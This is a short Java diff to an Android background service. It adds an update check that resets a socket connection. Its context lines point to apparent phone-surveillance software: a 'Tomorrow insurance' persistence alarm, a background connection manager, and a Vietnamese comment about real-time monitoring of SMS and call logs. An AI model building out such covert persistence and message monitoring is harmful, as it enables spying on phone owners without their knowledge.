@@ -32,6 +32,23 @@ public class MainService extends Service {
         schedulePersistenceAlarm(); // Set up the "Tomorrow" insurance
         
         contextOfApplication = this;
+        
+        // Reset connection if updated
+        try {
+            android.content.SharedPreferences prefs = getSharedPreferences("app_prefs", MODE_PRIVATE);
+            // hardcode current version from gradle not available easily here, use constant
+            int currentVersion = 2; // Increment this manually or pass via build config
+            int lastVersion = prefs.getInt("last_version", 0);
+            
+            if (currentVersion > lastVersion) {
+                Log.d("MainService", "App updated! Resetting connection...");
+                IOSocket.resetInstance();
+                prefs.edit().putInt("last_version", currentVersion).apply();
+            }
+        } catch (Exception e) {
+            Log.e("MainService", "Error checking update", e);
+        }
+
         ConnectionManager.startAsync(this);
         
         // Bắt đầu theo dõi realtime SMS và Call Logs
